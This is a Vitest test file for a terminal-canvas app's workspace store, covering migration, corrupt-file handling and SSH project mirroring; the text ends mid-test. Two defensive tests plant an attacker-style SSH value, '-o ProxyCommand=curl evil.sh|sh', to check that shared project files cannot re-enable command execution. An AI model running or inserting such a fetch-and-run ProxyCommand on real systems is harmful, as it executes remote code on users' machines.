import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { promises as fs } from 'fs'
import os from 'os'
import path from 'path'
import { initPlatform, resetPlatformForTests } from './platform'
import { fakePlatform } from './platform-fake'
import { WorkspaceStore } from './workspace-store'
import type { Project, Workspace } from '../shared/types'

let userData: string
let projRoot: string
let fake: ReturnType<typeof fakePlatform>

const project = (over: Partial<Project> = {}): Project => ({
  id: 'p1', name: 'foo', color: '#7aa2f7', viewport: { x: 0, y: 0, zoom: 1 },
  nodes: [{ id: 'term-1', kind: 'terminal', position: { x: 0, y: 0 }, size: { width: 1, height: 1 }, title: 't', color: '#fff', group: null }],
  ...over
})
const ws = (projects: Project[], active = projects[0]?.id ?? ''): Workspace =>
  ({ version: 2, activeProjectId: active, projects })

beforeEach(async () => {
  userData = await fs.mkdtemp(path.join(os.tmpdir(), 'nt-ws-'))
  projRoot = await fs.mkdtemp(path.join(os.tmpdir(), 'nt-proj-'))
  fake = fakePlatform({ userDataDir: userData })
  initPlatform(fake)
})
afterEach(async () => {
  resetPlatformForTests()
  await fs.rm(userData, { recursive: true, force: true })
  await fs.rm(projRoot, { recursive: true, force: true })
})

describe('save → load round trip (v3)', () => {
  it('creates and preserves a machine-local approval id outside the shared project file', async () => {
    const store = new WorkspaceStore()
    const workspace = ws([project({ cwd: projRoot })])

    await store.save(workspace)
    const firstIndex = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    const approvalId = firstIndex.entries[0].localApprovalId
    expect(approvalId).toMatch(/^[0-9a-f-]{36}$/)

    await store.save(workspace)
    const secondIndex = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(secondIndex.entries[0].localApprovalId).toBe(approvalId)
    expect(await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8'))
      .not.toContain('localApprovalId')
  })

  it('writes <cwd>/.nodeterm/project.json + a v3 index, and loads it back assembled', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot }), project({ id: 'p2', name: 'inline' })]))
    const file = JSON.parse(await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8'))
    expect(file).toMatchObject({ version: 1, id: 'p1', rev: 1 })
    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(index.version).toBe(3)
    expect(index.entries[0].cwd).toBe(projRoot)
    expect(index.entries[0].project).toBeUndefined()
    const loaded = await new WorkspaceStore().load()
    expect(loaded.version).toBe(2) // in-memory contract stays v2-shaped
    expect(loaded.projects[0]).toMatchObject({ id: 'p1', cwd: projRoot })
    expect(loaded.projects[0].nodes[0].id).toBe('term-1')
    expect(loaded.projects[1]).toMatchObject({ id: 'p2', name: 'inline' })
  })

  it('does not rewrite (or bump rev of) an unchanged project file', async () => {
    const store = new WorkspaceStore()
    const w = ws([project({ cwd: projRoot })])
    await store.save(w)
    const p = path.join(projRoot, '.nodeterm/project.json')
    const first = await fs.readFile(p, 'utf-8')
    await store.save(w)
    expect(await fs.readFile(p, 'utf-8')).toBe(first) // same rev, same bytes
    await store.save(ws([{ ...w.projects[0], name: 'renamed' }]))
    expect(JSON.parse(await fs.readFile(p, 'utf-8'))).toMatchObject({ rev: 2, name: 'renamed' })
  })
})

describe('v2 → v3 migration', () => {
  it('assembles a v2 file on load, then the first save migrates: project files + v3 index + .bak + broadcast', async () => {
    const legacy = ws([project({ cwd: projRoot })])
    await fs.writeFile(path.join(userData, 'workspace.json'), JSON.stringify(legacy))
    const store = new WorkspaceStore()
    const loaded = await store.load()
    expect(loaded.projects[0].id).toBe('p1')
    await store.save(loaded)
    expect(JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8')).version).toBe(3)
    expect(JSON.parse(await fs.readFile(path.join(userData, 'workspace.v2.bak'), 'utf-8')).version).toBe(2)
    expect((await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8'))).toContain('"id": "p1"')
    expect(fake.sent.some((s) => s.channel === 'workspace:migrated')).toBe(true)
  })

  it('is idempotent: loading + saving v3 again writes no .bak twice and keeps data', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    await fs.rm(path.join(userData, 'workspace.v2.bak'), { force: true })
    const again = new WorkspaceStore()
    await again.save(await again.load())
    await expect(fs.access(path.join(userData, 'workspace.v2.bak'))).rejects.toThrow()
  })
})

// I1: `ssh.extraArgs` HAS a producer (createSshTerminalNode copies it out of the machine-local SSH
// server store), so every existing ssh-terminal node with a jump host has one in its CURRENT
// project.json while the index has no `localExec` for it. Without a migration the first load after
// the upgrade drops it (the connection breaks), and the next save erases it from disk and
// propagates the deletion to every teammate via `rev`. Silently.
describe('inline (cwd-less) project kanban shape guard', () => {
  const writeInlineIndex = async (kanban: unknown): Promise<void> => {
    await fs.writeFile(
      path.join(userData, 'workspace.json'),
      JSON.stringify({
        version: 3,
        activeProjectId: 'p1',
        entries: [
          {
            id: 'p1',
            name: 'inline',
            color: '#7aa2f7',
            project: {
              id: 'p1', name: 'inline', color: '#7aa2f7', viewport: { x: 0, y: 0, zoom: 1 },
              nodes: [], kanban
            }
          }
        ]
      })
    )
  }

  it('drops a v1-shaped kanban on an inline project (degrades to fresh default, no crash)', async () => {
    await writeInlineIndex({ columns: [], cards: [] })
    const loaded = await new WorkspaceStore().load()
    expect(loaded.projects[0].id).toBe('p1')
    expect('kanban' in loaded.projects[0]).toBe(false)
  })

  it('keeps a well-formed inline kanban verbatim (does not over-strip)', async () => {
    const board = {
      columns: [{ id: 'kcol-a', title: 'To Do', color: '#0a84ff' }],
      assignments: [{ nodeId: 'term-abc', columnId: 'kcol-a' }]
    }
    await writeInlineIndex(board)
    const loaded = await new WorkspaceStore().load()
    expect(loaded.projects[0].kanban).toEqual(board)
  })
})

describe('one-time exec migration (pre-existing project files)', () => {
  /** A v3 index + project file written the way the PRE-fix app wrote them. */
  const writeLegacy = async (extraArgs: string): Promise<void> => {
    await fs.mkdir(path.join(projRoot, '.nodeterm'), { recursive: true })
    await fs.writeFile(
      path.join(projRoot, '.nodeterm/project.json'),
      JSON.stringify({
        version: 1, rev: 3, savedAt: 'then', id: 'p1', name: 'foo', color: '#7aa2f7',
        viewport: { x: 0, y: 0, zoom: 1 },
        nodes: [
          {
            id: 'ssh-1', kind: 'terminal', position: { x: 0, y: 0 },
            size: { width: 1, height: 1 }, title: 't', color: '#fff', group: null,
            ssh: { host: 'h', user: 'u', extraArgs }
          }
        ]
      })
    )
    await fs.writeFile(
      path.join(userData, 'workspace.json'),
      JSON.stringify({
        version: 3, activeProjectId: 'p1',
        entries: [{ id: 'p1', name: 'foo', color: '#7aa2f7', cwd: projRoot }]
      })
    )
  }

  it("hoists the file's exec values into the machine-local index, once, and keeps them working", async () => {
    await writeLegacy('-o ProxyCommand=corp-proxy %h')
    const store = new WorkspaceStore()
    const loaded = await store.load()
    // The jump host still reaches the node — and it is marked as this machine's own, so the exec
    // site (buildSshArgs) honors it.
    expect(loaded.projects[0].nodes[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')
    expect(loaded.projects[0].nodes[0].ssh?.execTrusted).toBe(true)

    await store.save(loaded)
    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(index.entries[0].localExec).toEqual({
      'ssh-1': { sshExtraArgs: '-o ProxyCommand=corp-proxy %h' }
    })
    expect(index.entries[0].execMigrated).toBe(true)
    // …and it is gone from the SHARED file (that is the whole point).
    const file = JSON.parse(
      await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8')
    )
    expect(file.nodes[0].ssh.extraArgs).toBeUndefined()
    expect(file.nodes[0].ssh.host).toBe('h')
    // The user is TOLD (one-time note), rather than finding out when something breaks.
    expect(
      fake.sent.some((m) => m.channel === 'workspace:migrated' && m.args[0] === 'exec')
    ).toBe(true)
  })

  it('never hoists twice: a project file changed AFTER the migration cannot re-arm it', async () => {
    await writeLegacy('-A')
    const store = new WorkspaceStore()
    await store.save(await store.load()) // migrates + records execMigrated
    // A teammate (or an attacker with a PR) puts an exec-enabling value back into the shared file.
    const fp = path.join(projRoot, '.nodeterm/project.json')
    const f = JSON.parse(await fs.readFile(fp, 'utf-8'))
    f.nodes[0].ssh.extraArgs = '-o ProxyCommand=curl evil.sh|sh'
    f.rev = 99
    await fs.writeFile(fp, JSON.stringify(f))

    const reloaded = await new WorkspaceStore().load()
    expect(reloaded.projects[0].nodes[0].ssh?.extraArgs).toBe('-A') // OUR value, not the file's
  })

  it('an unreadable ref is not marked migrated — its values are hoisted when it comes back', async () => {
    await writeLegacy('-o ProxyCommand=corp-proxy %h')
    const gone = path.join(projRoot, '.nodeterm/project.json')
    const keep = await fs.readFile(gone, 'utf-8')
    await fs.rm(gone)

    const store = new WorkspaceStore()
    const loaded = await store.load()
    expect(loaded.projects[0].unavailable).toBe(true)
    await store.save(loaded)
    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(index.entries[0].execMigrated).toBeUndefined() // still owed

    await fs.writeFile(gone, keep) // the disk is back
    const back = await new WorkspaceStore().load()
    expect(back.projects[0].nodes[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')
  })

  it('within ONE store instance, a deferred ref that comes back migrates exactly once', async () => {
    // The offline→online recovery inside a single, long-lived store: the entry was deferred (its
    // file was gone at first load), so its id sat in execUnmigrated. When the file returns and is
    // read again, that deferral must be cleared — otherwise save() never records execMigrated, the
    // hoist re-runs on every full load, and a project.json swapped in later would be re-hoisted.
    await writeLegacy('-o ProxyCommand=corp-proxy %h')
    const gone = path.join(projRoot, '.nodeterm/project.json')
    const keep = await fs.readFile(gone, 'utf-8')
    await fs.rm(gone)

    const store = new WorkspaceStore()
    const offline = await store.load()
    expect(offline.projects[0].unavailable).toBe(true) // deferred → id in execUnmigrated

    await fs.writeFile(gone, keep) // disk is back
    const online = await store.load() // SAME instance re-reads the now-readable ref
    expect(online.projects[0].nodes[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')

    await store.save(online)
    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(index.entries[0].execMigrated).toBe(true) // deferral cleared → migration recorded once
    expect(index.entries[0].localExec).toEqual({
      'ssh-1': { sshExtraArgs: '-o ProxyCommand=corp-proxy %h' }
    })

    // Now the migration is truly done: a hostile value put in the shared file afterward cannot be
    // hoisted as trusted (proves it does NOT keep re-running).
    const f = JSON.parse(await fs.readFile(gone, 'utf-8'))
    f.nodes[0].ssh.extraArgs = '-o ProxyCommand=curl evil.sh|sh'
    f.rev = 99
    await fs.writeFile(gone, JSON.stringify(f))
    const reloaded = await new WorkspaceStore().load()
    expect(reloaded.projects[0].nodes[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')
  })
})

describe('unavailable & corrupt refs', () => {
  it('marks a ref with a missing folder unavailable (kept, greyed) instead of dropping it', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    await fs.rm(projRoot, { recursive: true, force: true })
    const loaded = await new WorkspaceStore().load()
    expect(loaded.projects[0]).toMatchObject({ id: 'p1', name: 'foo', unavailable: true, nodes: [] })
  })

  it('sets aside a corrupt project file and marks the project unavailable', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    const p = path.join(projRoot, '.nodeterm/project.json')
    await fs.writeFile(p, '{ not json')
    const loaded = await new WorkspaceStore().load()
    expect(loaded.projects[0].unavailable).toBe(true)
    const dir = await fs.readdir(path.join(projRoot, '.nodeterm'))
    expect(dir.some((f) => f.startsWith('project.json.corrupt-'))).toBe(true)
  })

  it('sets aside a valid-JSON but wrong-shape project file and marks it unavailable', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    const p = path.join(projRoot, '.nodeterm/project.json')
    await fs.writeFile(p, '{"version": 99}') // parses, but not a ProjectFileV1
    const loaded = await new WorkspaceStore().load()
    expect(loaded.projects[0].unavailable).toBe(true)
    const dir = await fs.readdir(path.join(projRoot, '.nodeterm'))
    expect(dir.some((f) => f.startsWith('project.json.corrupt-'))).toBe(true)
  })

  it('load({ sideline: false }) marks a corrupt ref unavailable WITHOUT sidelining it', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    const p = path.join(projRoot, '.nodeterm/project.json')
    await fs.writeFile(p, '{ not json') // e.g. a git-conflict-marked file mid-merge
    const loaded = await new WorkspaceStore().load({ sideline: false })
    expect(loaded.projects[0].unavailable).toBe(true)
    const dir = await fs.readdir(path.join(projRoot, '.nodeterm'))
    expect(dir.some((f) => f.startsWith('project.json.corrupt-'))).toBe(false) // left in place
  })
})

describe('unavailable projects never overwrite real data on save', () => {
  it('save() of an unavailable local project does not touch the project file', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    const p = path.join(projRoot, '.nodeterm/project.json')
    const original = await fs.readFile(p, 'utf-8')
    // Folder goes missing at load → placeholder with nodes: []
    await fs.rm(projRoot, { recursive: true, force: true })
    const store2 = new WorkspaceStore()
    const loaded = await store2.load()
    expect(loaded.projects[0].unavailable).toBe(true)
    // Disk comes back with the real file (remounted / restored checkout) before the next save
    await fs.mkdir(path.join(projRoot, '.nodeterm'), { recursive: true })
    await fs.writeFile(p, original, 'utf-8')
    await store2.save(loaded)
    expect(await fs.readFile(p, 'utf-8')).toBe(original) // untouched — no nodes:[] overwrite
    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(index.entries[0].cwd).toBe(projRoot) // entry still refs the cwd
  })

  it('save() of an unavailable ssh project preserves the previous cache verbatim', async () => {
    // Chosen construction: seed a populated ssh cache in the index (so it loads fine), then
    // hand-mark the loaded project unavailable before save — the real data-loss scenario is
    // the placeholder replacing a *good* offline cache.
    const cache = {
      version: 1, rev: 5, savedAt: '2026-01-01T00:00:00.000Z',
      id: 's1', name: 'remote', color: '#7aa2f7', viewport: { x: 0, y: 0, zoom: 1 },
      nodes: [{ id: 'term-1', kind: 'terminal', position: { x: 0, y: 0 }, size: { width: 1, height: 1 }, title: 't', color: '#fff', group: null }]
    }
    const index = {
      version: 3, activeProjectId: 's1',
      entries: [{ id: 's1', name: 'remote', color: '#7aa2f7', ssh: { server: { host: 'h', user: 'u' }, remoteCwd: '~/app' }, cache }]
    }
    await fs.writeFile(path.join(userData, 'workspace.json'), JSON.stringify(index))
    const store = new WorkspaceStore()
    const loaded = await store.load()
    expect(loaded.projects[0].unavailable).toBeFalsy() // cache-backed → loads fine
    // Simulate the ref becoming unavailable in memory (e.g. server unreachable next cycle)
    loaded.projects[0] = { ...loaded.projects[0], unavailable: true, nodes: [] }
    await store.save(loaded)
    const after = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(after.entries[0].cache).toEqual(cache) // good offline cache survived verbatim
  })
})

describe('probeFolder', () => {
  it('returns the assembled project when the folder has a project file, else null', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    const probed = await store.probeFolder(projRoot)
    expect(probed).toMatchObject({ id: 'p1', cwd: projRoot })
    expect(await store.probeFolder(path.join(projRoot, 'nope'))).toBeNull()
  })

  it('is read-only: a corrupt file returns null WITHOUT sidelining it (arbitrary-path RPC)', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    const p = path.join(projRoot, '.nodeterm/project.json')
    await fs.writeFile(p, '{ not json')
    expect(await store.probeFolder(projRoot)).toBeNull()
    expect(await fs.readFile(p, 'utf-8')).toBe('{ not json') // untouched
    const dir = await fs.readdir(path.join(projRoot, '.nodeterm'))
    expect(dir.some((f) => f.startsWith('project.json.corrupt-'))).toBe(false) // no sideline
  })
})

describe('readLocalRefByPath', () => {
  it('maps a watched project.json path back to its project; unknown path → null', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    const filePath = path.join(projRoot, '.nodeterm/project.json')
    const p = await store.readLocalRefByPath(filePath)
    expect(p).toMatchObject({ id: 'p1', cwd: projRoot })
    expect(await store.readLocalRefByPath(path.join(projRoot, 'nope/project.json'))).toBeNull()
  })

  it('leaves a git-conflict-marked file in place (mid-merge is hand-resolvable, never sidelined)', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    const filePath = path.join(projRoot, '.nodeterm/project.json')
    const conflicted = '<<<<<<< HEAD\n{"version":1}\n=======\n{"version":1}\n>>>>>>> theirs\n'
    await fs.writeFile(filePath, conflicted)
    expect(await store.readLocalRefByPath(filePath)).toBeNull() // unparsable → no project
    expect(await fs.readFile(filePath, 'utf-8')).toBe(conflicted) // but left in place
    const dir = await fs.readdir(path.join(projRoot, '.nodeterm'))
    expect(dir.some((f) => f.startsWith('project.json.corrupt-'))).toBe(false)
  })
})

describe('same-cwd projects survive a save → load round trip', () => {
  it('two tabs on one folder both come back (first file-backed, second inline)', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ id: 'a', name: 'first', cwd: projRoot }), project({ id: 'b', name: 'second', cwd: projRoot })]))
    // Only one file exists on disk; the second is inline in the index.
    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(index.entries.filter((e: any) => e.cwd).length).toBe(1)
    expect(index.entries.find((e: any) => e.project)?.project.id).toBe('b')
    const loaded = await new WorkspaceStore().load()
    expect(loaded.projects.map((p) => p.id).sort()).toEqual(['a', 'b'])
    expect(loaded.projects.find((p) => p.id === 'a')).toMatchObject({ name: 'first', cwd: projRoot })
    expect(loaded.projects.find((p) => p.id === 'b')).toMatchObject({ name: 'second' })
  })
})

describe('projects.list relay blob (iOS wire contract)', () => {
  it('the blob JSON.stringify(load()) parses as {version:2, projects:[…]} even when the file is v3', async () => {
    // Seed a real v3 tree on disk (file-backed local ref), as listProjectsOutput sees it.
    await new WorkspaceStore().save(ws([project({ cwd: projRoot })]))
    const onDisk = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(onDisk.version).toBe(3) // the raw file the OLD blob shipped

    // listProjectsOutput now serves JSON.stringify(await workspaceStore.load()).
    const blob = JSON.stringify(await new WorkspaceStore().load())
    const parsed = JSON.parse(blob)
    expect(parsed.version).toBe(2)
    expect(Array.isArray(parsed.projects)).toBe(true)
    expect(parsed.projects[0]).toMatchObject({ id: 'p1', cwd: projRoot })
    expect(parsed.projects[0].nodes[0].id).toBe('term-1') // node data present (not in the v3 file)
  })
})

describe('localProjectCwds (the phone bridge jail roots)', () => {
  it('lists local ref cwds only — inline and ssh entries carry no host-local root', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([
      project({ cwd: projRoot }),
      project({ id: 'inline1', name: 'inline' }),
      project({ id: 'ssh1', ssh: { server: { host: 'h', user: 'u' } as never, remoteCwd: '~/x' }, cwd: undefined })
    ]))
    expect(store.localProjectCwds()).toEqual([projRoot])
  })

  it('empty before any load/save', () => {
    expect(new WorkspaceStore().localProjectCwds()).toEqual([])
  })
})

describe('appendRemoteNode (phone-registered sessions over the relay)', () => {
  it('appends into a local ref project file as an OUTSIDE edit (watcher must see it)', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ cwd: projRoot })]))
    const ok = await store.appendRemoteNode('p1', { id: 'term-zz1-1', title: 'Mobile' })
    expect(ok).toBe(true)
    const file = path.join(projRoot, '.nodeterm/project.json')
    const raw = await fs.readFile(file, 'utf-8')
    const f = JSON.parse(raw)
    expect(f.rev).toBe(2)
    expect(f.nodes.map((n: { id: string }) => n.id)).toContain('term-zz1-1')
    // NOT a self-write: the workspace watcher must treat this as an outside edit and broadcast
    // it, so the renderer adopts the node onto the live canvas.
    expect(store.isSelfWrite(file, raw)).toBe(false)
  })

  it('refuses unknown / ssh / cwd-less projects and corrupt files (nothing written)', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([
      project({ cwd: projRoot }),
      project({ id: 'ssh1', ssh: { server: { host: 'h', user: 'u' } as never, remoteCwd: '~/x' }, cwd: undefined }),
      project({ id: 'inline1' })
    ]))
    expect(await store.appendRemoteNode('nope', { id: 'term-a1-1' })).toBe(false)
    expect(await store.appendRemoteNode('ssh1', { id: 'term-a1-1' })).toBe(false)
    expect(await store.appendRemoteNode('inline1', { id: 'term-a1-1' })).toBe(false)
    const file = path.join(projRoot, '.nodeterm/project.json')
    await fs.writeFile(file, '{ not json')
    expect(await store.appendRemoteNode('p1', { id: 'term-a1-1' })).toBe(false)
    expect(await fs.readFile(file, 'utf-8')).toBe('{ not json') // untouched
  })
})

describe('refreshSshProject', () => {
  const sshConn = { server: { host: 'h', user: 'u' } as any, remoteCwd: '~/app' }
  const remoteFileOf = async (store: WorkspaceStore, p: Project) => {
    // seed: one ssh project saved → cache rev 1
    await store.save(ws([p]))
  }

  it('remote rev > cache rev → adopts remote and reports it', async () => {
    const remote: Record<string, string> = {}
    const io = {
      read: async (id: string) =>
        remote[id] != null ? { status: 'ok' as const, content: remote[id] } : { status: 'absent' as const },
      write: async (id: string, _s: any, c: string) => ((remote[id] = c), true)
    }
    const store = new WorkspaceStore(io)
    const p = project({ id: 'ps', ssh: sshConn, cwd: undefined })
    await remoteFileOf(store, p)                    // cache rev 1, mirrored to remote
    const newer = JSON.parse(remote['ps'])
    newer.rev = 5; newer.name = 'server-renamed'
    remote['ps'] = JSON.stringify(newer)
    const adopted = await store.refreshSshProject('ps')
    expect(adopted).toMatchObject({ id: 'ps', name: 'server-renamed' })
  })

  it('cache rev >= remote rev → pushes the cache up instead and returns null', async () => {
    const remote: Record<string, string> = {}
    const writes: string[] = []
    const io = {
      read: async (id: string) =>
        remote[id] != null ? { status: 'ok' as const, content: remote[id] } : { status: 'absent' as const },
      write: async (id: string, _s: any, c: string) => (writes.push(id), (remote[id] = c), true)
    }
    const store = new WorkspaceStore(io)
    await remoteFileOf(store, project({ id: 'ps', ssh: sshConn, cwd: undefined }))
    const older = JSON.parse(remote['ps'])
    older.rev = 0
    remote['ps'] = JSON.stringify(older)
    expect(await store.refreshSshProject('ps')).toBeNull()
    expect(writes.filter((w) => w === 'ps').length).toBeGreaterThanOrEqual(2) // seed + push-up
  })

  it('no remote file yet → pushes the cache up (first machine wins)', async () => {
    const remote: Record<string, string> = {}
    const io = {
      read: async () => ({ status: 'absent' as const }),
      write: async (id: string, _s: any, c: string) => ((remote[id] = c), true)
    }
    const store = new WorkspaceStore(io)
    await remoteFileOf(store, project({ id: 'ps', ssh: sshConn, cwd: undefined }))
    expect(await store.refreshSshProject('ps')).toBeNull()
    expect(remote['ps']).toContain('"id": "ps"')
  })
})

describe('ssh mirror guarantee (unmirrored retry)', () => {
  const sshConn = { server: { host: 'h', user: 'u' } as any, remoteCwd: '~/app' }

  /** Fake IO simulating a ControlMaster that is down until `up` flips: reads ERROR while down
   *  (a dead connection is not "no file"), writes fail while down. */
  const flakyIO = () => {
    const state = { up: false, writes: 0, remote: {} as Record<string, string> }
    const io = {
      read: async (id: string) => {
        if (!state.up) return { status: 'error' as const }
        return state.remote[id] != null
          ? { status: 'ok' as const, content: state.remote[id] }
          : { status: 'absent' as const }
      },
      write: async (id: string, _s: any, c: string) => {
        state.writes++
        if (!state.up) return false
        state.remote[id] = c
        return true
      }
    }
    return { state, io }
  }

  it('lands the mirror on a later save even when the first save ran disconnected', async () => {
    const { state, io } = flakyIO()
    const store = new WorkspaceStore(io)
    const w = ws([project({ id: 'ps', ssh: sshConn, cwd: undefined })])

    await store.save(w) // connection not up yet → read errors, nothing written, mirror owed
    expect(state.remote['ps']).toBeUndefined()

    state.up = true
    await store.save(w) // content unchanged, but the mirror is still owed
    expect(state.remote['ps']).toContain('"id": "ps"')
    expect(JSON.parse(state.remote['ps']).rev).toBe(1) // retry does not bump rev

    const writesSoFar = state.writes
    await store.save(w) // confirmed → unchanged saves stop writing
    expect(state.writes).toBe(writesSoFar)
  })

  it('markUnmirrored re-owes the mirror (a dropped trailing throttle write reports back)', async () => {
    const { state, io } = flakyIO()
    state.up = true
    const store = new WorkspaceStore(io)
    const w = ws([project({ id: 'ps', ssh: sshConn, cwd: undefined })])
    await store.save(w) // reconciles (absent) + pushes
    expect(state.remote['ps']).toContain('"id": "ps"')
    delete state.remote['ps'] // the acked-but-dropped trailing write: server never got it
    store.markUnmirrored('ps')
    await store.save(w) // unchanged content, but the debt is back
    expect(state.remote['ps']).toContain('"id": "ps"')
  })

  it('refreshSshProject records a failed push-up so the next save retries', async () => {
    const { state, io } = flakyIO()
    const store = new WorkspaceStore(io)
    const w = ws([project({ id: 'ps', ssh: sshConn, cwd: undefined })])
    await store.save(w) // dropped (down)

    expect(await store.refreshSshProject('ps')).toBeNull() // still down: read null, push-up fails
    state.up = true
    await store.save(w) // unchanged content, retried because refresh confirmed it is owed
    expect(state.remote['ps']).toContain('"id": "ps"')
  })

  it('a successful refresh push-up clears the debt (no redundant write on next save)', async () => {
    const { state, io } = flakyIO()
    const store = new WorkspaceStore(io)
    const w = ws([project({ id: 'ps', ssh: sshConn, cwd: undefined })])
    await store.save(w) // dropped
    state.up = true
    expect(await store.refreshSshProject('ps')).toBeNull() // push-up succeeds
    expect(state.remote['ps']).toContain('"id": "ps"')
    const writesAfterRefresh = state.writes
    await store.save(w) // unchanged + already mirrored → no write
    expect(state.writes).toBe(writesAfterRefresh)
  })
})

// THE reset bug (field report: 12 fresh project ids for one server folder in two weeks, 45 orphaned
// tmux sessions). Re-adding a folder via the SSH dialog minted a fresh project id with an empty
// canvas; its first mirror write clobbered the server's populated .nodeterm/project.json, and rev
// inflation (refresh seeded our counter from the remote lineage) made the empty canvas win every
// later reconcile. These tests pin the lineage rules that prevent it.
describe('ssh lineage safety', () => {
  const sshConn = { server: { host: 'h', user: 'u' } as any, remoteCwd: '~/app' }

  /** A populated remote project file from ANOTHER lineage (different project id). */
  const foreignRemote = (rev: number, nodes = 1) =>
    JSON.stringify({
      version: 1, rev, savedAt: 'then', id: 'old1', name: 'original', color: '#ffd60a',
      viewport: { x: 0, y: 0, zoom: 1 },
      nodes: Array.from({ length: nodes }, (_, i) => ({
        id: `term-old-${i + 1}`, kind: 'terminal', position: { x: 0, y: 0 },
        size: { width: 1, height: 1 }, title: 'survivor', color: '#fff', group: null
      }))
    })

  /** Fake IO keyed by remoteCwd — the server file is the same file no matter which local
   *  project id points at it (that is what makes re-adding dangerous). */
  const cwdIO = () => {
    const files: Record<string, string> = {}
    const io = {
      read: async (_id: string, ssh: any) =>
        files[ssh.remoteCwd] != null
          ? { status: 'ok' as const, content: files[ssh.remoteCwd] }
          : { status: 'absent' as const },
      write: async (_id: string, ssh: any, c: string) => ((files[ssh.remoteCwd] = c), true)
    }
    return { files, io }
  }

  it('a fresh empty project on a populated remote ADOPTS the remote (re-keyed to our id) instead of clobbering it', async () => {
    const { files, io } = cwdIO()
    files['~/app'] = foreignRemote(900)
    const store = new WorkspaceStore(io)
    // The dialog's re-add: fresh id, empty canvas.
    await store.save(ws([project({ id: 'fresh1', ssh: sshConn, cwd: undefined, nodes: [] })]))

    // The server file survived (never overwritten with the empty canvas).
    expect(JSON.parse(files['~/app']).nodes).toHaveLength(1)
    // The adoption is broadcast to the renderer under OUR project id (the renderer knows no 'old1').
    const msg = fake.sent.find((m) => m.channel === 'workspace:external-change')
    expect(msg).toBeTruthy()
    expect(msg!.args[0]).toMatchObject({ id: 'fresh1', name: 'original' })
    expect((msg!.args[0] as Project).nodes[0].id).toBe('term-old-1')

    // Rev continues the surviving lineage: the next real edit mirrors as rev 901, not rev 2.
    const adopted = msg!.args[0] as Project
    await store.save(ws([{ ...adopted, name: 'renamed' }]))
    expect(JSON.parse(files['~/app'])).toMatchObject({ rev: 901, id: 'fresh1', name: 'renamed' })
  })

  it('an EMPTY foreign remote never beats a populated cache, even with a higher rev — and the push outbids it', async () => {
    const { files, io } = cwdIO()
    files['~/app'] = foreignRemote(900, 0) // the clobbered file a buggy client left behind
    const store = new WorkspaceStore(io)
    await store.save(ws([project({ id: 'fresh1', ssh: sshConn, cwd: undefined })])) // 1 real node

    const after = JSON.parse(files['~/app'])
    expect(after.id).toBe('fresh1')
    expect(after.nodes).toHaveLength(1) // our populated canvas pushed up
    expect(after.rev).toBeGreaterThan(900) // and it WINS future rev reconciles
    expect(fake.sent.find((m) => m.channel === 'workspace:external-change')).toBeUndefined()
  })

  it('a read ERROR blocks the first mirror write entirely (no clobber on a flaky connect), then heals', async () => {
    const files: Record<string, string> = {}
    let up = false
    const io = {
      read: async (_id: string, ssh: any) => {
        if (!up) return { status: 'error' as const }
        return files[ssh.remoteCwd] != null
          ? { status: 'ok' as const, content: files[ssh.remoteCwd] }
          : { status: 'absent' as const }
      },
      write: async (_id: string, ssh: any, c: string) => {
        if (!up) return false
        files[ssh.remoteCwd] = c
        return true
      }
    }
    const store = new WorkspaceStore(io)
    const w = ws([project({ id: 'fresh1', ssh: sshConn, cwd: undefined })])
    await store.save(w)
    expect(files['~/app']).toBeUndefined() // error ≠ absent: nothing pushed blind
    up = true
    await store.save(w) // unchanged content — but the reconcile is still owed
    expect(files['~/app']).toContain('"id": "fresh1"')
  })

  // The mobile companion appends its new sessions to the server's project.json while the desktop
  // is running. The desktop polls the file (refreshSshProject with pushIfStanding:false) so those
  // nodes land on the live canvas — the poll must be read-only when our cache stands, or every
  // tick would spam a mirror write.
  it('poll: adopts a same-lineage remote that grew a node, and never writes when nothing is owed', async () => {
    const { files, io } = cwdIO()
    const writes: string[] = []
    const origWrite = io.write.bind(io)
